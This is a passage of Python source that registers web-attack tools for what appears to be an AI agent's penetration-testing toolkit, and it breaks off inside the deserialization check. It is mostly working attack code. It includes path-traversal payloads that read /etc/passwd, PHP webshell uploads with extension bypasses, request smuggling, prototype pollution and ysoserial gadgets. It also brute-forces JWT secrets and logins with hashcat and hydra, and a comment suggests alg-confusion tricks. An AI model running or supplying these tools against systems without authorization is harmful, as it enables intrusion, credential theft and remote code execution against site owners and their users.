# path_traversal  (../../../etc/passwd patterns)
# ---------------------------------------------------------------------------

async def _path_traversal(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "path").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
    ]
    results = []
    for payload in payloads:
        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if "root:" in stdout or "[extensions]" in stdout:
            results.append(f"  [VULN] {payload!r} → file content in response!")
        else:
            results.append(f"  [OK] {payload!r}")
    summary = f"Path traversal probe for {target} (param={param}):\n" + "\n".join(results)
    await _persist(project_id, "path_traversal", args, summary, "", 0)
    return summary


register(
    Tool(
        name="path_traversal",
        description="Test for path traversal vulnerabilities using ../../../etc/passwd patterns.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "Parameter name (default: path)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _path_traversal,
)


# ---------------------------------------------------------------------------
# file_upload_check
# ---------------------------------------------------------------------------

async def _file_upload_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target (upload endpoint URL) is required."
    field = (args.get("field") or "file").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    # Test uploads: PHP shell, PHP with different extensions, null byte
    tests = [
        ("shell.php", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
        ("shell.php.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>"),
        ("shell.pHp", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
        ("shell.php%00.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>"),
    ]
    results = []
    for filename, ct, content in tests:
        cmd = [
            "curl", "-sL", "-m", "15", "-X", "POST",
            "-F", f"{field}=@-;filename={filename};type={ct}",
            target,
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(input=content.encode()), timeout=20
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            results.append(f"  {filename} → TIMEOUT")
            continue
        resp = stdout_b.decode(errors="replace")
        results.append(f"  {filename} → rc={proc.returncode} response_len={len(resp)}")
    summary = f"File upload check for {target} (field={field}):\n" + "\n".join(results)
    await _persist(project_id, "file_upload_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="file_upload_check",
        description="Test file upload endpoint for extension bypass vulnerabilities (PHP webshell uploads).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Upload endpoint URL"},
                "field": {"type": "string", "description": "Form field name (default: file)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _file_upload_check,
)


# ---------------------------------------------------------------------------
# idor_check  (sequential ID manipulation)
# ---------------------------------------------------------------------------

async def _idor_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (use {ID} placeholder, e.g. /api/user/{ID})."
    start_id = int(args.get("start_id", 1))
    count = min(int(args.get("count", 5)), 20)
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    results = []
    for i in range(start_id, start_id + count):
        test_url = target.replace("{ID}", str(i))
        cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}"]
        if cookies:
            cmd += ["-H", f"Cookie: {cookies}"]
        cmd.append(test_url)
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        code_m = re.search(r"HTTP_CODE:(\d+)$", stdout)
        code = code_m.group(1) if code_m else "?"
        body = stdout[:200].replace("\n", " ")
        results.append(f"  ID={i} → HTTP {code} ({len(stdout)} bytes) {body[:80]}")
    summary = f"IDOR check for {target} (IDs {start_id}-{start_id+count-1}):\n" + "\n".join(results)
    await _persist(project_id, "idor_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="idor_check",
        description="Test for IDOR by iterating sequential IDs in a URL (use {ID} placeholder).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "URL with {ID} placeholder, e.g. 'http://host/api/user/{ID}'"},
                "start_id": {"type": "integer", "description": "Starting ID (default: 1)"},
                "count": {"type": "integer", "description": "Number of IDs to test (default: 5, max: 20)"},
                "cookies": {"type": "string", "description": "Cookie header for authenticated requests"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _idor_check,
)


# ---------------------------------------------------------------------------
# csrf_check  (check for CSRF tokens on forms)
# ---------------------------------------------------------------------------

async def _csrf_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sL", "-m", "15", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "csrf_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    forms = re.findall(r"<form[^>]*>.*?</form>", stdout, re.IGNORECASE | re.DOTALL)
    if not forms:
        return f"No forms found on {target}."
    lines = [f"CSRF check for {target} ({len(forms)} forms):"]
    csrf_patterns = ["csrf", "token", "_token", "authenticity_token", "nonce", "__RequestVerificationToken"]
    for i, form in enumerate(forms, 1):
        action_m = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
        action = action_m.group(1) if action_m else "(no action)"
        method_m = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
        method = method_m.group(1).upper() if method_m else "GET"
        has_token = any(p in form.lower() for p in csrf_patterns)
        status = "[PROTECTED]" if has_token else "[POTENTIALLY VULNERABLE]"
        lines.append(f"  Form {i}: {method} {action} {status}")
    return "\n".join(lines)


register(
    Tool(
        name="csrf_check",
        description="Parse HTML forms on a page and check for CSRF token fields.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _csrf_check,
)


# ---------------------------------------------------------------------------
# jwt_decode  (decode JWT — no verify)
# ---------------------------------------------------------------------------

async def _jwt_decode(args: dict) -> str:
    token = (args.get("token") or "").strip()
    if not token:
        return "Error: token is required."
    parts = token.split(".")
    if len(parts) != 3:
        return f"Error: invalid JWT format (expected 3 parts, got {len(parts)})."
    def b64_decode(s: str) -> str:
        s += "=" * (4 - len(s) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(s).decode(errors="replace"))
        except Exception as e:
            return f"<decode error: {e}>"
    header = b64_decode(parts[0])
    payload = b64_decode(parts[1])
    lines = [
        "JWT Decoded (no signature verification):",
        f"Header:  {json.dumps(header, indent=2)}",
        f"Payload: {json.dumps(payload, indent=2)}",
        f"Signature: {parts[2][:30]}...",
    ]
    alg = header.get("alg", "") if isinstance(header, dict) else ""
    if alg.lower() == "none":
        lines.append("[VULN] Algorithm is 'none' — signature not verified!")
    elif alg.upper() in ("HS256", "HS384", "HS512"):
        lines.append(f"[NOTE] HMAC algorithm {alg} — consider jwt_crack for weak secrets.")
    return "\n".join(lines)


register(
    Tool(
        name="jwt_decode",
        description="Decode a JWT token (no signature verification) and inspect header/payload claims.",
        inputSchema={
            "type": "object",
            "required": ["token"],
            "properties": {
                "token": {"type": "string", "description": "JWT token string"},
            },
        },
    ),
    _jwt_decode,
)


# ---------------------------------------------------------------------------
# jwt_crack  (hashcat mode 16500 or python brute)
# ---------------------------------------------------------------------------

async def _jwt_crack(args: dict) -> str:
    token = (args.get("token") or "").strip()
    if not token:
        return "Error: token is required."
    wordlist = (args.get("wordlist") or "/usr/share/wordlists/rockyou.txt").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))

    # [A] Detect the JWT algorithm and route to the right cracker. Only HMAC
    # algorithms are crackable by wordlist; RS256/ES256/PS256 require private
    # key compromise, not brute-force, so fail clearly.
    alg = _jwt_alg(token)
    if alg is None:
        return "Error: invalid JWT (cannot parse header)."
    HMAC_MODES = {"hs256": ("16500", hashlib.sha256),
                  "hs384": ("16600", hashlib.sha384),
                  "hs512": ("16700", hashlib.sha512)}
    if alg not in HMAC_MODES:
        return (
            f"Error: alg={alg!r} is not HMAC-based; brute-force wordlist crack does not apply. "
            f"For RS*/ES*/PS* signatures, you need the private key or an alg-confusion bug "
            f"(try alg=none, or RS→HS key confusion using the server's public key as HMAC secret)."
        )
    hashcat_mode, hash_fn = HMAC_MODES[alg]

    if shutil.which("hashcat"):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as f:
            f.write(token)
            jwt_file = f.name
        try:
            # Run cracker; then --show to retrieve cracked result in a clean
            # `hash:plaintext` format. Avoids the fragile ":(.+)$" regex.
            cmd = ["hashcat", "-m", hashcat_mode, jwt_file, wordlist, "--quiet"]
            stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
            if exit_code == -1:
                return stderr
            show_cmd = ["hashcat", "-m", hashcat_mode, jwt_file, "--show"]
            show_out, _, _ = await _run_subprocess(show_cmd, timeout=15)
        finally:
            os.unlink(jwt_file)
        # [G] Use rsplit so a colon in the hash itself can't confuse the parser.
        for line in show_out.splitlines():
            if ":" in line and line.startswith(token):
                secret = line.rsplit(":", 1)[1]
                return f"JWT cracked (alg={alg})! Secret: {secret}"
        return f"hashcat: no secret found for alg={alg}.\n{stdout[-500:]}"

    # Fallback: Python brute-force, now alg-aware.
    parts = token.split(".")
    if len(parts) != 3:
        return "Error: invalid JWT."
    header_payload = f"{parts[0]}.{parts[1]}".encode()
    sig_b64 = parts[2]

    def verify(secret: bytes) -> bool:
        sig = hmac.new(secret, header_payload, hash_fn).digest()
        expected = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return hmac.compare_digest(expected, sig_b64)

    try:
        with open(wordlist, "rb") as wf:
            for line in wf:
                secret = line.strip()
                if verify(secret):
                    return f"JWT secret found (alg={alg}): {secret.decode(errors='replace')}"
    except FileNotFoundError:
        return f"Error: wordlist not found at {wordlist}"
    return f"JWT secret not found in wordlist (alg={alg})."


register(
    Tool(
        name="jwt_crack",
        description="Brute-force JWT HMAC secret using hashcat (mode 16500) or Python fallback.",
        inputSchema={
            "type": "object",
            "required": ["token"],
            "properties": {
                "token": {"type": "string", "description": "JWT token to crack"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: rockyou.txt)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _jwt_crack,
)


# ---------------------------------------------------------------------------
# waf_detect  (wafw00f)
# ---------------------------------------------------------------------------

async def _waf_detect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("wafw00f"):
        return "Error: wafw00f not found in PATH. Install: pip install wafw00f"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["wafw00f", target, "-a"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "waf_detect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No WAF detected on {target}."


register(
    Tool(
        name="waf_detect",
        description="Detect Web Application Firewalls using wafw00f.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _waf_detect,
)


# ---------------------------------------------------------------------------
# rate_limit_check  (send N requests and check for 429)
# ---------------------------------------------------------------------------

async def _rate_limit_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    n = min(int(args.get("requests", 20)), 100)
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    codes: list[str] = []
    tasks = []
    for _ in range(n):
        async def fetch():
            cmd = ["curl", "-sI", "-m", "5", "-w", "%{http_code}", "-o", "/dev/null", target]
            out, err, rc = await _run_subprocess(cmd, timeout=timeout_s)
            return out.strip()
        tasks.append(asyncio.create_task(fetch()))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, str):
            codes.append(r)
    counter: dict[str, int] = {}
    for c in codes:
        counter[c] = counter.get(c, 0) + 1
    summary_lines = [f"Rate limit check for {target} ({n} requests):"]
    for code, cnt in sorted(counter.items(), key=lambda x: -x[1]):
        summary_lines.append(f"  HTTP {code}: {cnt} times")
    if "429" in counter:
        summary_lines.append("[PROTECTED] Rate limiting detected (HTTP 429 received).")
    else:
        summary_lines.append("[NOTE] No 429 responses — rate limiting may not be enforced.")
    summary = "\n".join(summary_lines)
    await _persist(project_id, "rate_limit_check", args, summary, "", 0)
    return summary


register(
    Tool(
        name="rate_limit_check",
        description="Send N concurrent requests to check if rate limiting (HTTP 429) is enforced.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "requests": {"type": "integer", "description": "Number of requests (default: 20, max: 100)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _rate_limit_check,
)


# ---------------------------------------------------------------------------
# graphql_probe  (test /graphql for introspection)
# ---------------------------------------------------------------------------

async def _graphql_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    endpoints = ["/graphql", "/api/graphql", "/graphiql", "/v1/graphql", "/query"]
    base = target.rstrip("/")
    introspection_query = '{"query":"{__schema{queryType{name}}}"}'
    results = []
    for ep in endpoints:
        url = base + ep
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", introspection_query, url,
        ]
        if cookies:
            cmd += ["-H", f"Cookie: {cookies}"]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if "__schema" in stdout or "queryType" in stdout:
            results.append(f"  [VULN] {url} → Introspection ENABLED! Schema exposed.")
        elif "errors" in stdout.lower() or rc == 0:
            results.append(f"  [EXISTS] {url} → GraphQL endpoint responds (introspection disabled or partial)")
        else:
            results.append(f"  [404] {url}")
    summary = f"GraphQL probe for {base}:\n" + "\n".join(results)
    await _persist(project_id, "graphql_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="graphql_probe",
        description="Probe common GraphQL endpoints and test for introspection being enabled.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Base URL, e.g. 'http://10.10.10.1'"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _graphql_probe,
)


# ---------------------------------------------------------------------------
# api_fuzz  (ffuf on API endpoints)
# ---------------------------------------------------------------------------

async def _api_fuzz(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (use FUZZ placeholder)."
    if not shutil.which("ffuf"):
        return "Error: ffuf not found in PATH."
    wordlist = (args.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    url = target if "FUZZ" in target else f"{target.rstrip('/')}/FUZZ"
    cmd = [
        "ffuf", "-u", url, "-w", wordlist,
        "-v", "-mc", "200,201,204,301,302,307,401,403,405",
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "api_fuzz", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No API endpoints discovered on {target}."


register(
    Tool(
        name="api_fuzz",
        description="Fuzz API endpoints using ffuf with an API wordlist.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Base URL or URL with FUZZ placeholder"},
                "wordlist": {"type": "string", "description": "API endpoints wordlist"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _api_fuzz,
)


# ---------------------------------------------------------------------------
# http_smuggle  (smuggler.py or manual CL.TE test)
# ---------------------------------------------------------------------------

async def _http_smuggle(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    # Try smuggler.py if available
    smuggler_paths = ["/opt/smuggler/smuggler.py", "/usr/local/bin/smuggler.py", shutil.which("smuggler")]
    smuggler = next((p for p in smuggler_paths if p and Path(p).exists()), None)
    if smuggler:
        cmd = ["python3", smuggler, "-u", target, "--quiet"]
        stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
        await _persist(project_id, "http_smuggle", args, stdout, stderr, exit_code)
        return stdout or stderr or "smuggler.py returned no output."
    # Manual CL.TE test via curl
    cl_te_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target.split('//')[-1].split('/')[0]}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    result = (
        "smuggler.py not found. Manual CL.TE probe payload:\n\n"
        f"{cl_te_payload}\n\n"
        "Use Burp Suite HTTP Request Smuggler extension for automated testing."
    )
    await _persist(project_id, "http_smuggle", args, result, "", 0)
    return result


register(
    Tool(
        name="http_smuggle",
        description="Test for HTTP request smuggling using smuggler.py (if available) or generate manual CL.TE probe.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _http_smuggle,
)


# ---------------------------------------------------------------------------
# clickjack_check  (check X-Frame-Options header)
# ---------------------------------------------------------------------------

async def _clickjack_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 15))
    cmd = ["curl", "-sIL", "-m", "10", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "clickjack_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    xfo = re.search(r"(?i)^X-Frame-Options:\s*(.+)", stdout, re.MULTILINE)
    csp = re.search(r"(?i)^Content-Security-Policy:\s*(.+)", stdout, re.MULTILINE)
    lines = [f"Clickjacking check for {target}:"]
    if xfo:
        lines.append(f"  X-Frame-Options: {xfo.group(1).strip()} [PROTECTED]")
    else:
        lines.append("  X-Frame-Options: MISSING")
    if csp:
        csp_val = csp.group(1)
        if "frame-ancestors" in csp_val.lower():
            lines.append(f"  CSP frame-ancestors: PRESENT [PROTECTED]")
        else:
            lines.append(f"  CSP frame-ancestors: NOT SET in CSP")
    else:
        lines.append("  Content-Security-Policy: MISSING")
    if not xfo and (not csp or "frame-ancestors" not in (csp.group(1) if csp else "").lower()):
        lines.append("[POTENTIALLY VULNERABLE] No clickjacking protection found.")
    return "\n".join(lines)


register(
    Tool(
        name="clickjack_check",
        description="Check for clickjacking protection via X-Frame-Options and CSP frame-ancestors.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 15)"},
            },
        },
    ),
    _clickjack_check,
)


# ---------------------------------------------------------------------------
# nikto_scan  (nikto -h)
# ---------------------------------------------------------------------------

async def _nikto_scan(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("nikto"):
        return "Error: nikto not found in PATH. Install: apt install nikto"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = ["nikto", "-h", target, "-nointeractive"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "nikto_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"nikto returned no output for {target}."


register(
    Tool(
        name="nikto_scan",
        description="Web server vulnerability scan using nikto.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL or host"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _nikto_scan,
)


# ---------------------------------------------------------------------------
# wordpress_scan  (wpscan --url)
# ---------------------------------------------------------------------------

async def _wordpress_scan(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("wpscan"):
        return "Error: wpscan not found in PATH. Install: gem install wpscan"
    api_token = (args.get("api_token") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = ["wpscan", "--url", target, "--no-banner", "-e", "ap,at,u"]
    if api_token:
        cmd += ["--api-token", api_token]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "wordpress_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"wpscan returned no output for {target}."


register(
    Tool(
        name="wordpress_scan",
        description="WordPress vulnerability and enumeration scan using wpscan.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "WordPress site URL"},
                "api_token": {"type": "string", "description": "WPScan API token for vulnerability data"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _wordpress_scan,
)


# ---------------------------------------------------------------------------
# auth_brute_http  (hydra http-form-post)
# ---------------------------------------------------------------------------

async def _auth_brute_http(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("hydra"):
        return "Error: hydra not found in PATH. Install: apt install hydra"
    userlist = (args.get("userlist") or "/usr/share/seclists/Usernames/top-usernames-shortlist.txt").strip()
    passlist = (args.get("passlist") or "/usr/share/wordlists/rockyou.txt").strip()
    form_path = (args.get("form_path") or "/login").strip()
    form_params = (args.get("form_params") or "username=^USER^&password=^PASS^").strip()
    fail_str = (args.get("fail_str") or "Invalid").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname or target
    scheme = "https-post-form" if parsed.scheme == "https" else "http-post-form"
    cmd = [
        "hydra", "-L", userlist, "-P", passlist, host, scheme,
        f"{form_path}:{form_params}:F={fail_str}", "-t", "4",
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "auth_brute_http", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    valid = [ln for ln in stdout.splitlines() if "[http" in ln.lower() and "login:" in ln.lower()]
    if valid:
        return "Credentials found:\n" + "\n".join(valid)
    return f"hydra http brute-force complete. No credentials found.\n{stdout[-1000:]}"


register(
    Tool(
        name="auth_brute_http",
        description="Brute-force HTTP form authentication using hydra http-post-form.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL, e.g. 'http://10.10.10.1'"},
                "userlist": {"type": "string", "description": "Path to username wordlist"},
                "passlist": {"type": "string", "description": "Path to password wordlist"},
                "form_path": {"type": "string", "description": "Login form path (default: /login)"},
                "form_params": {"type": "string", "description": "Form POST params (default: username=^USER^&password=^PASS^)"},
                "fail_str": {"type": "string", "description": "Failure string in response (default: Invalid)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _auth_brute_http,
)


# ---------------------------------------------------------------------------
# csp_check  (parse and evaluate CSP header)
# ---------------------------------------------------------------------------

async def _csp_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 15))
    cmd = ["curl", "-sIL", "-m", "10", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "csp_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    csp_m = re.search(r"(?i)^Content-Security-Policy:\s*(.+)", stdout, re.MULTILINE)
    if not csp_m:
        return f"[MISSING] No Content-Security-Policy header on {target}."
    csp = csp_m.group(1).strip()
    directives = {}
    for part in csp.split(";"):
        part = part.strip()
        if part:
            tokens = part.split()
            directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []
    issues = []
    script_src = directives.get("script-src", directives.get("default-src", []))
    if "'unsafe-inline'" in script_src:
        issues.append("  [WEAK] script-src contains 'unsafe-inline' — XSS mitigations bypassed")
    if "'unsafe-eval'" in script_src:
        issues.append("  [WEAK] script-src contains 'unsafe-eval'")
    if "*" in script_src:
        issues.append("  [WEAK] script-src wildcard '*' allows any source")
    if not directives.get("script-src") and not directives.get("default-src"):
        issues.append("  [MISSING] No script-src or default-src directive")
    lines = [f"CSP Analysis for {target}:", f"  Raw: {csp[:200]}"]
    lines += (issues if issues else ["  [OK] No obvious CSP weaknesses found"])
    return "\n".join(lines)


register(
    Tool(
        name="csp_check",
        description="Parse and evaluate the Content-Security-Policy header for common weaknesses.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 15)"},
            },
        },
    ),
    _csp_check,
)


# ---------------------------------------------------------------------------
# prototype_pollution  (test JSON prototype pollution)
# ---------------------------------------------------------------------------

async def _prototype_pollution(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        '{"__proto__":{"polluted":"yes"}}',
        '{"constructor":{"prototype":{"polluted":"yes"}}}',
        '{"__proto__.polluted":"yes"}',
    ]
    results = []
    for payload in payloads:
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/json",
            "-d", payload, target,
        ]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if "polluted" in stdout:
            results.append(f"  [VULN] payload={payload[:50]!r} → 'polluted' reflected in response!")
        else:
            results.append(f"  [OK] payload={payload[:50]!r} → rc={rc} len={len(stdout)}")
    # Also check GET params
    get_payloads = ["?__proto__[polluted]=yes", "?constructor[prototype][polluted]=yes"]
    for gp in get_payloads:
        cmd = ["curl", "-sL", "-m", "10", f"{target}{gp}"]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if "polluted" in stdout:
            results.append(f"  [VULN] GET {gp!r} → 'polluted' in response!")
    summary = f"Prototype pollution test for {target}:\n" + "\n".join(results)
    await _persist(project_id, "prototype_pollution", args, summary, "", 0)
    return summary


register(
    Tool(
        name="prototype_pollution",
        description="Test for JavaScript prototype pollution via JSON POST and GET parameter injection.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _prototype_pollution,
)


# ---------------------------------------------------------------------------
# deserialization_check  (ysoserial payloads or PHP unserialize check)
# ---------------------------------------------------------------------------

async def _deserialization_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    lang = (args.get("lang") or "java").strip().lower()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    if lang == "java":
        # [E] Actually deliver the payload to the target with a sleep gadget and
        # observe the timing delta. [F] Java serialized blobs contain non-UTF-8
        # bytes (0xAC 0xED magic); _run_subprocess decodes stdout with
        # errors='replace' which mangles binary. Solution: redirect ysoserial
        # stdout straight to a temp file via a shell-free wrapper, then curl
        # --data-binary @file so the bytes hit the wire intact.
        ysoserial = shutil.which("ysoserial") or "/opt/ysoserial/ysoserial.jar"
        if not Path(ysoserial).exists() and not shutil.which("ysoserial"):
            return (
                "ysoserial not found. Download from https://github.com/frohoff/ysoserial\n"
                "Place at /opt/ysoserial/ysoserial.jar\n\n"
                "Manual test: send a serialized Java object (AC ED 00 05 magic bytes) and check for errors.\n"
                "Look for 'java.io.InvalidClassException' or similar in responses."
            )
        SLEEP_SEC = 5
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            payload_path = f.name
        try:
            # Run ysoserial writing directly to the temp file — bypasses pipe decoding.
            proc = await asyncio.create_subprocess_exec(
                "java", "-jar", ysoserial, "CommonsCollections1", f"sleep {SLEEP_SEC}",
                stdout=open(payload_path, "wb"),
                stderr=asyncio.subprocess.PIPE,
            )
            try:
